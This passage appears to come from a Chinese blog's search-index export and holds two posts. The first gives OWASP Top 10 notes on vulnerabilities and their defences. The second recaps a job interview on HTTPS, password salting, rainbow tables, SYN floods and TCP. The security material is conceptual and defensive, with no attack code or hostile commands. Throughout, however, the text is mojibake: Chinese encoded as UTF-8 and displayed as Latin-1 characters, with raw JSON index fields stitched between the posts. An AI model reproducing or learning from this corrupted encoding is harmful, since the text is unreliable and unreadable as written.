æ•æ„Ÿæ•°æ®æ³„éœ² è§£é‡Š ï¼šè¯¥æ¼æ´çš„æ ¸å¿ƒæ˜¯å¯†ç ç®—æ³•çš„å¤±æ•ˆï¼ˆCryptographic Failuresï¼‰ã€‚æ•°æ®åœ¨ å­˜å‚¨ ã€ ä¼ è¾“ æˆ– äº¤äº’ è¿‡ç¨‹ä¸­æ²¡æœ‰ä½¿ç”¨åˆç†çš„åŠ å¯†ç®—æ³•è¿›è¡Œä¿æŠ¤ï¼Œä½¿å¾—å…¶ä¸­æ•æ„Ÿæ•°æ®è¢«æ³„éœ²ã€‚\né˜²æŠ¤ ï¼š\nå¯¹æ²¡å¿…è¦å­˜å‚¨çš„æ•æ„Ÿæ•°æ®äºˆä»¥åŠæ—¶é”€æ¯ï¼Œå­˜å‚¨çš„æ•æ„Ÿæ•°æ®ç¡®ä¿åŠ å¯†ã€‚ ä½¿ç”¨æœ€æ–°çš„ã€å¼ºå¤§çš„ç®—æ³•ã€åè®®ã€å¯†é’¥ï¼Œä¸”å¯†é’¥å¦¥å–„ç®¡ç†ã€‚ ç¡®ä¿æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­å—åˆ°åŠ å¯†ä¿æŠ¤ï¼Œå¦‚ä½¿ç”¨HSTSã€‚ 19.4 XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰ è§£é‡Š ï¼šè®¸å¤šè¾ƒæ—©çš„æˆ–é…ç½®é”™è¯¯çš„XMLå¤„ç†å™¨è§£æäº†XMLæ–‡ä»¶ä¸­çš„å¤–éƒ¨å®ä½“å¼•ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›å¤–éƒ¨å®ä½“çªƒå–æœåŠ¡ä¾§çš„å†…éƒ¨æ–‡ä»¶å’Œå…±äº«æ–‡ä»¶ã€å®è¡Œå†…ç½‘æ‰«æã€è¿œç¨‹ä»£ç æ‰§è¡Œå’Œæ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆå¯ä»¥å½’çº³ä¸ºSSRFå—ï¼Ÿï¼‰\né˜²æŠ¤ ï¼š\nä½¿ç”¨ç®€å•çš„æ•°æ®æ ¼å¼ï¼ˆå¦‚JSONï¼‰ï¼Œé¿å…å¯¹æ•æ„Ÿæ•°æ®è¿›è¡Œåºåˆ—åŒ–ã€‚ XMLåº“çš„ç‰ˆæœ¬æ£€æŸ¥ï¼ŒåŠæ—¶æ›´æ–°ä¿®å¤ç›¸å…³ç»„ä»¶ã€‚ åœ¨XMLè§£æå™¨ä¸Šç¦ç”¨å¤–éƒ¨å®ä½“å’ŒDTDï¼ˆæ–‡æ¡£å®šä¹‰ç±»å‹ï¼‰ã€‚ æœåŠ¡ç«¯å®æ–½ç™½åå•æœºåˆ¶ï¼Œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤å’Œæ¸…æ´—ã€‚ 19.5 å¤±æ•ˆçš„è®¿é—®æ§åˆ¶ è§£é‡Š ï¼šBroken Access Control ï¼Œå’Œ19.2ä¸­çš„ Broken Authentication æ˜¯æœ‰åŒºåˆ«çš„ã€‚ä¸ªäººç†è§£ï¼Œå¤±æ•ˆçš„è®¿é—®æ§åˆ¶ä¸»è¦æ˜¯æŒ‡æ”»å‡»è€…å·²ç»å…·å¤‡äº†ä¸€ä¸ªåˆæ³•ç”¨æˆ·ï¼Œåªæ˜¯ä»–æ‰€å¯¹åº”çš„è®¿é—®æƒé™å¯ä»¥ç»ç”±æŸç§æ‰‹æ®µè¿›è¡Œæå‡ï¼Œä»è€Œè®¿é—®æŸäº›æœªç»æˆæƒçš„åŠŸèƒ½æˆ–æ•°æ®ã€‚\né˜²æŠ¤ ï¼š\nè®¿é—®æ§åˆ¶åªæœ‰åœ¨æœåŠ¡ç«¯æœ‰æ•ˆ ã€‚ é™¤å…¬æœ‰èµ„æºå¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹æ‹’ç»è®¿é—®å…¶ä»–èµ„æºã€‚ å»ºç«‹ä¸€æ¬¡æ€§çš„è®¿é—®æ§åˆ¶æœºåˆ¶ï¼Œå¹¶åœ¨æ•´ä¸ªåº”ç”¨ä¸­ä¸æ–­é‡ç”¨ä»–ä»¬ã€‚ å»ºç«‹è®¿é—®æ§åˆ¶æ¨¡å‹ä»¥å¼ºåˆ¶æ‰§è¡Œæ‰€æœ‰æƒè®°å½•ï¼Œè€Œä¸æ˜¯æ¥å—ç”¨æˆ·åˆ›å»ºã€è¯»å–ã€æ›´æ–°æˆ–åˆ é™¤çš„ä»»ä½•è®°å½•ï¼ˆå¼ºåˆ¶è®¿é—®æ§åˆ¶MACï¼Ÿï¼‰ã€‚ è®°å½•å¤±è´¥çš„è®¿é—®æ§åˆ¶ï¼Œå¹¶åŠæ—¶å‘Šè­¦ã€‚ 19.6 å®‰å…¨é…ç½®é”™è¯¯ è§£é‡Š ï¼šé¡¾åæ€ä¹‰ã€‚è¿™ä¸ªé—®é¢˜æ˜¯å¾ˆå¸¸è§çš„å®‰å…¨é—®é¢˜ï¼Œé€šå¸¸ç”±äºä¸å®‰å…¨çš„é»˜è®¤é…ç½®ã€ä¸å®Œæ•´çš„ä¸´æ—¶ç¯å¢ƒã€å¼€æºäº‘å­˜å‚¨ã€é”™è¯¯çš„HTTPæ ‡å¤´é…ç½®ä»¥åŠåŒ…å«æ•æ„Ÿä¿¡æ¯çš„è¯¦ç»†é”™è¯¯ä¿¡æ¯æ‰€é€ æˆçš„ã€‚\né˜²æŠ¤ ï¼š\nå®æ–½å®‰å…¨çš„å®‰è£…è¿‡ç¨‹ï¼Œå¦‚å¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ç¯å¢ƒä¸­ä¿æŒç›¸åŒå®‰å…¨é…ç½®ï¼Œä¸”å£ä»¤ä¸åŒã€‚å®‰è£…è¿‡ç¨‹å°½é‡è‡ªåŠ¨åŒ–ï¼Œä»¥å‡å°å‡ºé”™çš„å¯èƒ½ã€‚ æ­å»ºæœ€å°åŒ–å¹³å°ï¼Œç§»é™¤æ‰€æœ‰ä¸å¿…è¦çš„åŠŸèƒ½ã€ç»„ä»¶ã€æ–‡ä»¶åŠç¤ºä¾‹ã€‚ æ£€æŸ¥å’Œä¿®å¤å®‰å…¨é…ç½®é¡¹æ¥é€‚åº”æœ€æ–°çš„å®‰å…¨è¯´æ˜ã€æ›´æ–°å’Œè¡¥ä¸ï¼Œå¹¶å°†å…¶ä½œä¸ºæ›´æ–°ç®¡ç†è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚æ£€æŸ¥è¿‡ç¨‹ä¸­ï¼Œç‰¹åˆ«æ³¨æ„äº‘å­˜å‚¨çš„æƒé™ã€‚ å‘å®¢æˆ·ç«¯å‘é€å®‰å…¨æŒ‡ä»¤ï¼Œå¦‚å®‰å…¨æ ‡å¤´ï¼ˆæƒ³åˆ°äº†CSPã€HTTP-Onlyï¼‰ã€‚ 19.7 è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ è§£é‡Š ï¼šç½‘é¡µä¸­ä½¿ç”¨äº†ç”¨æˆ·æä¾›çš„å‚æ•°ï¼Œä¸”è¿™äº›å‚æ•°æ²¡æœ‰è¢«å¦¥å–„åœ°è½¬ä¹‰ï¼Œå¯èƒ½å¼•å‘æµè§ˆå™¨å°†è¿™äº›å‚æ•°å½“ä½œåŸæœ¬ç½‘é¡µä¸­çš„è„šæœ¬ï¼Œäºˆä»¥æ‰§è¡Œã€‚\né˜²æŠ¤ ï¼š\nä½¿ç”¨è®¾è®¡ä¸Šå°±ä¼šè‡ªåŠ¨ç¼–ç æ¥è§£å†³XSSé—®é¢˜çš„æ¡†æ¶ï¼Œå¦‚Ruby 3.0æˆ–React JSã€‚äº†è§£æ¯ä¸ªæ¡†æ¶XSSä¿æŠ¤çš„å±€é™æ€§ï¼Œå¹¶é€‚å½“åœ°å¤„ç†æœªè¦†ç›–çš„ç”¨ä¾‹ã€‚ æ ¹æ®HTMLä¸Šä¸‹æ–‡å¯¹æ‰€æœ‰ä¸å—ä¿¡ä»»çš„HTTPè¯·æ±‚æ•°æ®è¿›è¡Œè½¬ä¹‰ or ç¼–ç ã€‚ å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ ï¼Œå¦‚æœä¸å­˜åœ¨æœ¬åœ°æ–‡ä»¶ä¸Šä¼ çš„å…¶ä»–æ¼æ´ï¼Œå°†ç»æ€ã€‚ï¼ˆå¤§è‡´æ€æƒ³æ˜¯å‘å®¢æˆ·ç«¯å‘é€å®‰å…¨æŒ‡ä»¤ï¼Œé™å®šåªæ‰§è¡ŒæŸäº›åŸŸåä¸‹çš„è„šæœ¬ï¼‰ã€‚ 19.8 ä¸å®‰å…¨çš„ååºåˆ—åŒ– è§£é‡Š ï¼šåºåˆ—åŒ–æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ã€‚åœ¨åºåˆ—å·æœŸé—´ï¼Œå¯¹è±¡å°†å…¶å½“å‰çŠ¶æ€å†™å…¥åˆ°ä¸´æ—¶æˆ–æŒä¹…æ€§å­˜å‚¨åŒºã€‚ä»¥åï¼Œå¯ä»¥é€šè¿‡ä»å­˜å‚¨åŒºä¸­è¯»å–æˆ–ååºåˆ—åŒ–å¯¹è±¡çš„çŠ¶æ€ï¼Œæ¥é‡å»ºè¯¥å¯¹è±¡ã€‚ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ˜¯æŒ‡æ”»å‡»è€…æä¾›æ¶æ„çš„ç¯¡æ”¹è¿‡çš„å¯¹è±¡ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºå’ŒAPIå˜å¾—è„†å¼±ã€‚\né’ˆå¯¹ååºåˆ—åŒ–æ¼æ´ï¼Œä¸»è¦æœ‰ä¸¤ç§æ”»å‡»å½¢å¼ï¼š\nåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ”¹å˜åº”ç”¨é€»è¾‘æˆ–å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œç§°ä¸º å¯¹è±¡å’Œæ•°æ®ç»“æ„æ”»å‡» ï¼› ç¯¡æ”¹åºåˆ—åŒ–ä¹‹åçš„æ•°æ®ï¼Œå®ç°è®¿é—®æ§åˆ¶ç›¸å…³çš„æ”»å‡»ï¼› é˜²æŠ¤ ï¼š\nå”¯ä¸€å®‰å…¨çš„æ¶æ„æ˜¯ä¸æ¥å—æ¥è‡ªä¸å—ä¿¡æºçš„åºåˆ—åŒ–å¯¹è±¡ã€‚ å¯ä»¥è€ƒè™‘æ‰§è¡Œå®Œæ•´æ€§æ£€æŸ¥ï¼Œå¦‚å¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œæ•°å­—ç­¾åï¼Œé˜²æ­¢æ¶æ„å¯¹è±¡åˆ›å»ºæˆ–æ•°æ®ç¯¡æ”¹ã€‚ å°†ååºåˆ—åŒ–ä»£ç éš”ç¦»åœ¨ä½ç‰¹æƒç¯å¢ƒä¸­è¿è¡Œã€‚ ç›‘æ§ååºåˆ—åŒ–è¡Œä¸ºï¼Œè®°å½•ååºåˆ—åŒ–çš„ä¾‹å¤–æƒ…å†µå’Œå¤±è´¥ä¿¡æ¯ã€‚ 19.9 ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶ è§£é‡Š ï¼šç»„ä»¶ï¼ˆåº“ã€æ¡†æ¶å’Œå…¶ä»–æ¨¡å—ï¼‰æ‹¥æœ‰å’Œåº”ç”¨ç¨‹åºç›¸åŒçš„æƒé™ã€‚å¦‚æœåº”ç”¨ç¨‹åºä¸­å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå¯èƒ½é€ æˆä¸¥é‡çš„æ•°æ®ä¸¢å¤±æˆ–æœåŠ¡å™¨æ¥ç®¡ã€‚\né˜²æŠ¤ ï¼š\nç§»é™¤ä¸ä½¿ç”¨çš„ä¾èµ–ã€ä¸éœ€è¦çš„åŠŸèƒ½ã€ç»„ä»¶ã€æ–‡æ¡£ã€‚ åˆ©ç”¨å„ç§å·¥å…·æ¥æŒç»­è®°å½•å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä»¥åŠå®ƒä»¬çš„ä¾èµ–åº“çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚æŒç»­ç›‘æ§CVEç­‰ä¿¡æ¯æ¥åˆ¤æ–­å·²æœ‰ç»„ä»¶æ˜¯å¦æœ‰æ¼æ´ã€‚ ä½¿ç”¨å®˜æ–¹æ¸ é“å®‰å…¨åœ°è·å–ç»„ä»¶ï¼Œå¹¶ä½¿ç”¨ç­¾åæœºåˆ¶æ¥é™ä½ç»„ä»¶è¢«ç¯¡æ”¹æˆ–åŠ å…¥æ¶æ„æ¼æ´çš„é£é™©ã€‚ ç›‘æ§é‚£äº›ä¸å†ç»´æŠ¤æˆ–ä¸å‘å¸ƒå®‰å…¨è¡¥ä¸çš„åº“å’Œç»„ä»¶ã€‚ 19.10 ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§ è§£é‡Š ï¼šä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§ï¼Œä½¿å¾—æ”»å‡»è€…åœ¨ç³»ç»Ÿä¸­å¯ä»¥æ›´éšè”½åœ°é©»ç•™ã€æ”»å‡»ã€æ¨ªå‘ç§»åŠ¨ã€é”€æ¯è¯æ®ã€‚\né˜²æŠ¤ ï¼š\nç¡®ä¿æ‰€æœ‰ç™»å½•ã€è®¿é—®æ§åˆ¶å¤±è´¥ã€è¾“å…¥éªŒè¯å¤±è´¥éƒ½èƒ½è¢«è®°å½•åˆ°æ—¥å¿—ä¸­å»ï¼Œå¹¶ä¿ç•™è¶³å¤Ÿçš„ç”¨æˆ·ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œä»¥è¯†åˆ«å¯ç–‘æˆ–æ¶æ„è´¦æˆ·ï¼Œå¹¶ä¸ºåæœŸå–è¯ç•™è¶³æ—¶é—´ã€‚ ç¡®ä¿æ—¥å¿—ä»¥ä¸€ç§èƒ½å¤Ÿè¢«é›†ä¸­æ—¥å¿—ç®¡ç†è§£å†³æ–¹æ¡ˆä½¿ç”¨çš„å½¢å¼ç”Ÿæˆã€‚ ç¡®ä¿é«˜é¢äº¤æ˜“æœ‰å®Œæ•´æ€§æ§åˆ¶çš„å®¡è®¡ä¿¡æ¯ï¼Œä¸”å®¡è®¡ä¿¡æ¯å¿…é¡»é˜²æ­¢ç¯¡æ”¹æˆ–åˆ é™¤ã€‚ é‡‡ç”¨æœ‰æ•ˆçš„ç›‘æ§å’Œå‘Šè­¦æœºåˆ¶ã€‚ é‡‡ç”¨ä¸€ä¸ªåº”æ€¥å“åº”æœºåˆ¶å’Œæ¢å¤è®¡åˆ’ã€‚ ","date":"2021-08-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E7%A7%8B%E6%8B%9B-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/","title":"ç§‹æ‹› | ä¸€äº›çŸ¥è¯†ç‚¹"},{"content":"è°èƒ½æƒ³åˆ°æˆ‘ä¸€ä¸ªå®‰å…¨ä¸“ä¸šçš„äººä¼šè¢«åç«¯å¼€å‘å²—æèµ·æ¥å‘¢ -_-||\næŒ‰ç…§ç«æ˜Ÿå…¬å¸çš„æ€§æ ¼ï¼Œä¸Šå²¸æ¦‚ç‡ä¸å¤§ã€‚è¿™ç¯‡å…ˆä½œä¸ºdraftï¼Œæš‚æ—¶ä¸åœ¨åšå®¢ä¸Šå‘è¡¨å‡ºæ¥ã€‚\n1 HTTPSçš„æµç¨‹ï¼Ÿ æ¯”è¾ƒeasyçš„é—®é¢˜ï¼Œç®—æ˜¯çœ‹åœ¨æˆ‘çš„å®‰å…¨ç»éªŒä¸Šæ¥é€åˆ†çš„ï¼Ÿ\næ­¤å‰æ•´ç†è¿‡è¿™ä¸ªé—®é¢˜ â˜ ç§‹æ‹› | ä¸€äº›çŸ¥è¯†ç‚¹ (xr_gçš„åšå®¢) ï¼Œä½†æ˜¯é¢è¯•çš„æ—¶å€™ç¨å¾®æœ‰ç‚¹ç´§å¼ ï¼Œå¿˜äº†ä¸€äº›ç»†èŠ‚ã€‚å›ç­”çš„æ˜¯åŸºäºå…¬é’¥å¯†ç çš„å¯†é’¥äº¤æ¢ï¼ˆè¿™ä¸ªæµç¨‹æ¯”è¾ƒå¥½è®°ï¼‰ï¼›ä½†å®é™…ä¸ŠHTTPSè¿˜æœ‰åŸºäºECDHEçš„å¯†é’¥äº¤æ¢ï¼Œå½“æ—¶è®°å¾—ä¸å¤Ÿæ¸…æ¥šï¼Œä¹Ÿå°±æ²¡è·Ÿé¢è¯•å®˜è®²äº†ã€‚\n1.1 ä¸ºä»€ä¹ˆHTTPSä¸ç”¨å…¬é’¥åŠ å¯†é€šä¿¡ï¼Ÿ è‚¯å®šæ˜¯æ•ˆç‡å•Šï¼\néå¯¹ç§°åŠ å¯†çš„ç®—æ³•èƒ½å¤Ÿå¾—åˆ°ä¸¥è°¨çš„å®‰å…¨æ€§è¯æ˜ï¼Œä½†æ˜¯å®ƒçš„åŠ è§£å¯†æ•ˆç‡æ¯”è¾ƒä½ï¼›å¯¹ç§°åŠ å¯†ç®—æ³•åœ¨è®¾è®¡æ—¶å°±å……åˆ†è€ƒè™‘äº†è®¡ç®—æœºç¡¬ä»¶çš„è¿ç®—ä¼˜åŠ¿ï¼Œæ‰€ä»¥æ•ˆç‡å¾ˆé«˜ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨éå¯¹ç§°åŠ å¯†ç®—æ³•æ¥è¿›è¡Œå¯†é’¥äº¤æ¢ï¼Œä½¿ç”¨äº¤æ¢åçš„å¯†é’¥è¿›è¡Œå¯¹ç§°åŠ å¯†çš„é€šä¿¡ã€‚\n2 å¬è¿‡åŠ ç›å—ï¼Ÿ åœ¨å­˜å‚¨ç”¨æˆ·å£ä»¤çš„æ—¶å€™ï¼Œåœ¨å£ä»¤åé¢é™„ä¸Šä¸€äº›ä¸ç”¨æˆ·èº«ä»½ç›¸å…³çš„å€¼ï¼Œç„¶åå†è¿›è¡Œå“ˆå¸Œã€‚\nè¿™æ ·åšçš„å¥½å¤„æ˜¯å¯¹äºä¸åŒç”¨æˆ·çš„ç›¸åŒå£ä»¤ï¼Œä¸ä¼šå¾—åˆ°ç›¸åŒçš„å“ˆå¸Œå€¼ï¼Œé¿å…äº†æ’åº“å’Œæš´åŠ›ç ´è§£ã€‚\nå½“æ—¶å¯æ²¡ç­”å‡ºæ’åº“å’Œçˆ†ç ´ï¼Œå†·é™ä¸‹æ¥æ‰å‘ç°ç­”å¾—æœ‰å¤šçƒ‚ï¼ˆæ‚²ï¼‰ã€‚\n2.1 é‚£ä¸€èˆ¬å–ä»€ä¹ˆå€¼æ¥ä½œä¸ºç›å‘¢ï¼Ÿ å‘ƒï¼Œå—¯ï¼Œè¿™ä¸ªâ€¦â€¦\nä¸€èˆ¬å–è·Ÿç”¨æˆ·èº«ä»½ç›¸å…³çš„å€¼ï¼Ÿæ¯”å¦‚ç”¨æˆ·IDï¼Ÿ\näº‹åå‘ç°å½“æ—¶å°‘è¯´äº†ä¸€ä¸ªéšæœºå€¼ã€‚\n3 å¬è¿‡å½©è™¹è¡¨ï¼Ÿ å¤§æ¦‚æ˜¯é¢„å…ˆè®¡ç®—ä¸€äº›æ˜æ–‡çš„å“ˆå¸Œå€¼ï¼Œç„¶åå¯¹ç€å¾—åˆ°çš„å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒç ´è§£ï¼Ÿ\nå·´æ‹‰äº†åŠå¤©ï¼Œå‘ç°æˆ‘è¯´çš„å…¶å®å°±æ˜¯å“ˆå¸Œå­—å…¸ã€‚\nç„¶è€Œå½©è™¹è¡¨ä¸æ˜¯è¿™æ ·çš„ï¼è¯¦è§ å¯†ç ç ´è§£çš„åˆ©å™¨â€”â€”å½©è™¹è¡¨ï¼ˆrainbow tableï¼‰ - ç®€ä¹¦ (jianshu.com) ã€‚\néƒé—·ï¼ŒåˆæŒ‚ä¸€é¢˜ã€‚\n4 å¬è¿‡SYNæ”»å‡»å—ï¼Ÿ SYN Floodï¼Ÿå¥½äº²åˆ‡ï¼\nTCPä¸‰æ¬¡æ¡æ‰‹æ—¶ï¼Œå½“æœåŠ¡ç«¯æ”¶åˆ°ä¸€ä¸ªSYNï¼Œè¿”å›ACK+SYNçš„æ—¶å€™ï¼Œå°±ä¸ºæœ¬æ¬¡è¿æ¥åˆ†é…äº†èµ„æºï¼Œå³æ‰€è°“çš„ åŠå¼€è¿æ¥ ã€‚\nè€Œå®¢æˆ·ç«¯éœ€è¦å®Œæˆç¬¬ä¸‰æ¬¡æ¡æ‰‹ä¹‹åï¼Œæ‰åˆ†é…è¿æ¥èµ„æºã€‚\nå‡å¦‚æœ‰å¾ˆå¤šå®¢æˆ·ç«¯ï¼ŒåŒæ—¶å‘æœåŠ¡ç«¯å‘é€SYNï¼Œä½†ä¸å®Œæˆç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œå°±ä¼šä»¥è‡ªèº«å¾ˆå°‘çš„èµ„æºæ¶ˆè€—ã€æ¥å ç”¨æœåŠ¡ç«¯å¤§é‡çš„è¿æ¥èµ„æºï¼Œä½¿å¾—æœåŠ¡ç«¯æ— æ³•æ¥å—å…¶ä»–æ­£å¸¸å®¢æˆ·ç«¯çš„è¿æ¥ã€‚\n4.1 å¦‚ä½•é˜²å¾¡å‘¢ï¼Ÿ ä¸€èˆ¬çš„WAFéƒ½èƒ½è¯†åˆ«æ­¤ç±»æ”»å‡»ã€‚\næ­¤å¤–ï¼Œå¯ä»¥åœ¨æœåŠ¡ç«¯é€‚å½“åœ°ç¼©å‡åŠå¼€è¿æ¥çš„è¶…æ—¶æ—¶é—´ï¼Œå³æ›´å¿«åœ°æ¸…é™¤æ²¡ç”¨çš„åŠå¼€è¿æ¥ï¼ˆæˆ‘åœ¨è¯´ä»€ä¹ˆè‰¹ï¼‰ã€‚\nè¿˜æœ‰å°±æ˜¯å¯ä»¥ç”¨ä»£ç†æœåŠ¡å™¨å…ˆæ¥å—è¿æ¥ï¼Œè¿™ç±»æœåŠ¡å™¨ä¸€èˆ¬å¯ä»¥é’ˆå¯¹SYNè¿›è¡Œç¡¬ä»¶ä¸Šçš„ä¼˜åŒ–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¸€å®šçš„ç®—æ³•æ¥è¯†åˆ«SYN Floodï¼ˆå®åœ¨æƒ³ä¸å‡ºè¯†åˆ«çš„ç®—æ³•ï¼Œå«ç³Šå…¶è¾äº†ï¼‰ã€‚\næ­£è§£ï¼šä»£ç†æœåŠ¡å™¨æ²¡æ¯›ç—…ï¼Œå¯ä»¥ä½¿ç”¨cookieæºè®¤è¯ç­‰åŠæ³•æ¥è¯†åˆ«æ¶æ„å®¢æˆ·ç«¯ï¼›è¿˜æœ‰ä¸»æœºä¸Šå¯ä»¥è®¾ç½®SYN Cacheï¼Œå…ˆä¸ä¸ºåŠå¼€è¿æ¥åˆ†é…èµ„æºï¼Œç­‰å»ºç«‹è¿æ¥ä¹‹åå†ä»cacheä¸­å–å‡ºåŠå¼€è¿æ¥çš„ä¿¡æ¯ï¼Œåˆ†é…èµ„æºã€‚\näºæˆ‘ä»¥å‰è¿˜æ•´ç†è¿‡ï¼ŒçœŸæ­£è¦ç”¨çš„æ—¶å€™æƒ³ä¸èµ·æ¥äº† -_-||\nDoSâ€”â€”æ‹’ç»æœåŠ¡æ”»å‡» (gitee.io)\n5 TCPå’ŒUDPçš„åŒºåˆ«ï¼Ÿ å¯ä»¥å†å…«è‚¡ä¸€ç‚¹ï¼Ÿ\nTCPæ˜¯é¢å‘è¿æ¥çš„ï¼Œå­—èŠ‚æµï¼›UDPæ˜¯æ— è¿æ¥çš„ï¼ŒæŠ¥æ–‡æµã€‚\nç¼–ç¨‹å®ç°ä¸Šä¹Ÿæœ‰ä¸€äº›åŒºåˆ«ï¼Œä½†æ˜¯æˆ‘æ²¡ç”¨è¿‡UDPç¼–ç¨‹ï¼ˆæˆ‘åˆåœ¨è¯´ä»€ä¹ˆï¼‰ã€‚\nè¿˜æœ‰å°±æ˜¯TCPçš„è¿æ¥æ˜¯å¯é çš„ï¼Œæœ‰ä¸€äº›åŠæ³•æ¥ä¿è¯ã€‚\n5.1 æ€ä¹ˆä¿è¯TCPè¿æ¥å¯é ï¼Ÿ æŒ–å‘åŸ‹è‡ªå·±â€¦â€¦\næƒ³ä¸èµ·æ¥äº†ã€‚\næ­£è§£ï¼šæ ¡éªŒã€åºå·ã€ç¡®è®¤ã€é‡ä¼ ã€‚\nä¸è¯´äº†ï¼Œæœ‰ç©ºä¸€å®šçœ‹è®¡ç½‘ o(â•¥ï¹â•¥)o\nä¼ è¾“å±‚åè®®â€”â€”TCP (gitee.io)\n5.2 å‡å¦‚æœåŠ¡ç«¯è¦æ¥æ”¶1ã€2ã€3ã€4ã€5å·åŒ…ï¼Œå¦‚ä½•ç¡®ä¿æœ‰åºï¼Ÿ å‘é€çª—å£å’Œæ¥æ”¶çª—å£å§ï¼Ÿ\nä¾‹å¦‚æœåŠ¡ç«¯æ”¶åˆ°äº†2~5å·åŒ…ï¼Œè€Œæ²¡æœ‰æ”¶åˆ°1å·åŒ…ï¼Œæ­¤æ—¶å°±å‘é€ ACK=1 ï¼Œå‘ŠçŸ¥å®¢æˆ·ç«¯é‡ä¼ 1å·åŒ…ã€‚ç”±äºå®¢æˆ·ç«¯ä¹Ÿç»´æŒç›¸åŒçš„å‘é€çª—å£ï¼Œå¯ä»¥åªé‡ä¼ 1å·åŒ…è€Œä¸é‡ä¼ å…¶ä»–ã€‚\nè¿˜æœ‰å†—ä½™ACKï¼Œè„‘å­é‡Œæƒ³åˆ°äº†ï¼Œå½“æ—¶èŠç€èŠç€å°±å¿˜è®°è¯´å‡ºæ¥äº†ã€‚\n5.3 TCPç²˜åŒ…å¬è¿‡å—ï¼Ÿ å¬è¿‡ï¼Œå¤§æ¦‚å°±æ˜¯ç”±äºç½‘ç»œåŸå› ï¼ŒæŠŠä¸¤ä¸ªåŒ…è§†ä½œäº†ä¸€ä¸ªåŒ…è¿›è¡Œå¤„ç†ï¼Ÿ\nå…·ä½“æ˜¯ä»€ä¹ˆæƒ…å†µä¼šå‡ºç°ç²˜åŒ…ï¼Ÿ\nemmmï¼Œå¯èƒ½æ˜¯åè®®æ ˆå®ç°çš„æ—¶å€™å‡ºäº†ç‚¹é—®é¢˜ï¼Ÿä¹Ÿå¯èƒ½æ˜¯ç½‘ç»œåŸå› â€¦â€¦\næ­£è§£ï¼šå…¶å®æ˜¯å› ä¸ºTCPæ˜¯å­—èŠ‚æµçš„ä¼ è¾“ï¼Œå‘é€ç«¯å‘å¤šå°‘æ•°æ®å’Œæ¥æ”¶ç«¯ä¸€æ¬¡æ”¶å¤šå°‘æ•°æ®ï¼Œæ²¡æœ‰å¿…ç„¶çš„è”ç³»ã€‚è¿™å°±å¯èƒ½å‡ºç°å‘é€ç«¯ä¸€æ¬¡å‘é€ n å­—èŠ‚ï¼Œè€Œæ¥æ”¶ç«¯ä¸€æ¬¡æ¥æ”¶ 2n å­—èŠ‚ï¼Œä¸¤ä¸ªåŒ…å°±ç²˜åˆ°ä¸€èµ·äº†ã€‚æ­¤å¤–ï¼Œå¯èƒ½åœ¨å‘é€ç«¯è¦ç­‰åˆ°ç¼“å†²åŒºæ»¡äº†æ‰å‘ï¼Œé‚£ä¹ˆå°±æœ‰å¥½å‡ ä¸ªåŒ…ç²˜åˆ°ä¸€èµ·å‘é€çš„æƒ…å†µã€‚\nå†…å¿ƒOSï¼šå…¶å®å¥½åƒè¿˜çœŸæ˜¯åè®®æ ˆçš„å®ç°é—®é¢˜ï¼Ÿ\nè¯¦è§ ç²˜åŒ…é—®é¢˜åŠè§£å†³ - xuchong - åšå®¢å›­ (cnblogs.com) ï¼Œå†™å¾—çœŸä¸é”™ï¼\n6 ä½ çŸ¥é“å“ªäº›HTTPå¤´ï¼Ÿ User-Agent\nReferer\nXFF\nEncodeï¼Ÿï¼Ÿï¼ˆè®°å¿†æ¨¡ç³Šäº†ï¼Œå…¶å®æƒ³è¯´Accept-Encodingï¼‰\nContent-Length\nâ€¦â€¦ï¼ˆè¢«æ‰“æ–­ï¼‰\nXFFå½“æ—¶æ²¡è¯´ä¸Šå«ä¹‰ï¼Œå…¶å®æ˜¯å‘Šè¯‰æœåŠ¡ç«¯è¿™ä¸ªè¯·æ±‚è€…çš„æœ€åˆå§‹IPã€‚\næ„Ÿè°¢å½“å¹´åšè¿‡çš„ä¸€ä¸ªç®€å•Webé¢˜â€¦â€¦\nXFFä¸Refererï¼ˆå«å®æ“ï¼‰_slj1552560çš„åšå®¢-CSDNåšå®¢_xff\n7 I/O å¤šè·¯å¤ç”¨ï¼Ÿ å¬è¿‡ï¼Œä½†å®Œå…¨æ²¡å°è±¡ï¼Œpassã€‚\n8 æ•°æ®åº“ 8.1 left-joinã€inner-joinã€right-joinï¼Ÿ 